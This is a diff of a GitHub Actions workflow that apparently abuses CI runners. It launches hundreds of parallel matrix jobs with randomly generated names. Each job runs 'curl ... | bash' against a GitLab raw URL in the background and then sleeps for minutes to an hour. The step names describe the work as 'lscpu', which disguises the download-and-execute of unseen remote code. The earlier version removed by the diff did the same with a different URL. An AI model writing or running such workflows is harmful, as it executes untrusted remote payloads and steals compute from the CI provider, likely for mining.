@@ -1,69 +1,130 @@
-name: ERTEWSWA
+name: autospaces-raiodala
 
 on:
   workflow_dispatch:
-    inputs:
-      command:
-        description: 'Perintah untuk job nert & dert'
-        required: false
-        default: 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash'
+  push:
+    branches: ["main"]
   schedule:
-    - cron: '0 */6 * * *'   # setiap 6 jam
+    - cron: '0 */6 * * *'
+
+permissions: {}   # 🔒 Tidak ada akses ke repo atau token
 
 jobs:
-  hert:
+  # =============================================
+  # 🔮 Generator Matriks Acak (sekali per run)
+  # =============================================
+  generate:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        build: [X.1, Y.1]                                          
-        flag: [Alpha, Beta, Gamma, Delta, Epsilon, Zeta, Eta, Theta, Iota, Kappa]  
+    outputs:
+      build_go: ${{ steps.gen.outputs.build_go }}
+      build_flag: ${{ steps.gen.outputs.build_flag }}
+      cincau_go: ${{ steps.gen.outputs.cincau_go }}
+      cincau_flag: ${{ steps.gen.outputs.cincau_flag }}
+      tepung_go: ${{ steps.gen.outputs.tepung_go }}
+      tepung_flag: ${{ steps.gen.outputs.tepung_flag }}
+      tekwan_go: ${{ steps.gen.outputs.tekwan_go }}
+      tekwan_flag: ${{ steps.gen.outputs.tekwan_flag }}
     steps:
-      - name: hertob
-        continue-on-error: true
-        run: echo hert
-
-  nert:
-    needs: [hert]
-    runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        build: [N1, N2, N3, N4, N5, N6, N7, N8, N9, N10]        
-        flag: [Red, Blue, Green, Yellow, Purple, Orange, Pink, Cyan, Magenta, Lime, Teal, Lavender, Maroon, Navy] 
-    steps:
-      - name: Jalankan perintah (background + sleep 4 menit)
-        continue-on-error: true
+      - name: Generate random strings
+        id: gen
+        shell: python
         run: |
-          ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} &
+          import random, string, json, os
+
+          def random_strings(n, min_len=3, max_len=5):
+              res = set()
+              while len(res) < n:
+                  length = random.randint(min_len, max_len)
+                  chars = string.ascii_letters + string.digits
+                  s = ''.join(random.choice(chars) for _ in range(length))
+                  res.add(s)
+              return list(res)
+
+          # Tentukan jumlah sesuai masing-masing job
+          specs = {
+              'build_go': 9, 'build_flag': 26,
+              'cincau_go': 9, 'cincau_flag': 26,
+              'tepung_go': 9, 'tepung_flag': 26,
+              'tekwan_go': 9, 'tekwan_flag': 3
+          }
+
+          with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
+              for name, count in specs.items():
+                  vals = random_strings(count)
+                  f.write(f"{name}={json.dumps(vals)}\n")
+
+  # =============================================
+  # 📦 Job build (234 job) – lscpu + sleep 330s
+  # =============================================
+  build:
+    needs: generate
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    strategy:
+      max-parallel: 50
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.build_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.build_flag) }}
+    steps:
+      - name: Jalankan lscpu & tahan 5.5 menit
+        run: |
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
           sleep 240s
 
-  dert:
-    needs: [nert]
+  # =============================================
+  # 🧊 Job cincau (234 job) – lscpu + sleep 21m
+  # =============================================
+  cincau:
+    needs: [generate, build]
     runs-on: ubuntu-latest
+    timeout-minutes: 25
     strategy:
+      max-parallel: 250
       fail-fast: false
       matrix:
-        build: [D1, D2, D3, D4, D5, D6, D7, D8, D9, D10]                 
-        flag: [One, Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten, Eleven, Twelve]  
+        go: ${{ fromJSON(needs.generate.outputs.cincau_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.cincau_flag) }}
     steps:
-      - name: dertjob (background + sleep 18 menit)
-        continue-on-error: true
+      - name: Jalankan lscpu & tahan 15 menit
         run: |
-          ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} &
-          sleep 12m
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
+          sleep 15m
 
-  mart:
-    needs: [dert]
+  # =============================================
+  # 🍚 Job tepung (234 job) – lscpu + sleep 35m
+  # =============================================
+  tepung:
+    needs: [generate, build]   # paralel dengan cincau
     runs-on: ubuntu-latest
+    timeout-minutes: 40
     strategy:
+      max-parallel: 250
       fail-fast: false
       matrix:
-        build: [M1, M2, M3, M4, M5, M6, M7, M8]                
-        flag: [Spring, Summer, Autumn, Winter, Monsoon, Dry, Wet, Hot, Cold, Warm, Cool, Mild]  
+        go: ${{ fromJSON(needs.generate.outputs.tepung_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.tepung_flag) }}
     steps:
-      - name: martjob (background + sleep 120 menit)
-        continue-on-error: true
+      - name: Jalankan lscpu & tahan 35 menit
         run: |
-          ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} &
-          sleep 120m
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
+          sleep 35m
+
+  # =============================================
+  # 🍜 Job tekwan (27 job) – lscpu + sleep 62m
+  # =============================================
+  tekwan:
+    needs: [generate, cincau]
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.tekwan_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.tekwan_flag) }}
+    steps:
+      - name: Jalankan lscpu & tahan 62 menit
+        run: |
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
+          sleep 62m
